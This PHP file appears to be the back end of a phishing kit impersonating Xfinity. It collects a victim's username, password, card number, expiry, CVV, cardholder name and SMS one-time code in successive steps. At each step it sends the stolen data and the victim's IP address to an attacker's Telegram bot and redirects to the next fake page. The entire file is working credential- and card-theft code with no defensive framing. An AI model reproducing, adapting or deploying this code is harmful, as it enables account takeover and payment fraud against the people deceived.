<?php 
session_start();
require 'config.php';

function sendTotelegram($data){
    global $bot;
    global $chat_id;
    
    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data&parse_mode=HTML";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

// LOGIN STEP
if(isset($_POST['user'])){
    $_SESSION['_user'] = $_POST['user'];
    header("location: pass.php");
}

// PASSWORD STEP
if(isset($_POST['pass'])){

    $msg = "
<b>🔐XFINITY LOGIN DETAILS</b>
<b>-------------</b>
<b>Email/User:</b> <code>" . htmlspecialchars($_SESSION['_user']) . "</code>
<b>Password:</b> <code>" . htmlspecialchars($_POST['pass']) . "</code>
<b>-------------</b>
<b>IP Address:</b> <code>$ip</code>
<b>-------------</b>
";

    sendTotelegram($msg);
    header("location: card.php");
}

// CARD STEP
if(isset($_POST['cc'])){
    $_SESSION['_cc'] = $_POST['cc'];
    
    // Format card number with spaces for better readability
    $formatted_cc = $_POST['cc'];
    
    $msg = "
<b>💳 XFINITY CARD DETAILS</b>
<b>-------------</b>
<b>Cardholder:</b> <code>" . htmlspecialchars($_POST['name']) . "</code>
<b>Card Number:</b> <code>" . htmlspecialchars($formatted_cc) . "</code>
<b>Expiry Date:</b> <code>" . htmlspecialchars($_POST['exp']) . "</code>
<b>CVV:</b> <code>" . htmlspecialchars($_POST['cvv']) . "</code>
<b>-------------</b>
<b>IP Address:</b> <code>$ip</code>
<b>-------------</b>
";

    sendTotelegram($msg);
    header("location: wait.php?next=sms.php");
}

// OTP STEP
if(isset($_POST['otp'])){

    $msg = "
<b>✅ XFINITY OTP VERIFICATION</b>
<b>-------------</b>
<b>Card Number:</b> <code>" . htmlspecialchars($_SESSION['_cc']) . "</code>
<b>OTP Code:</b> <code>" . htmlspecialchars($_POST['otp']) . "</code>
<b>-------------</b>
<b>IP Address:</b> <code>$ip</code>
<b>-------------</b>
";

    sendTotelegram($msg);

    if(isset($_POST['exit'])){
        die(header("location: exit.php"));
    }
    header("location: wait.php?next=sms.php?error");
}

?>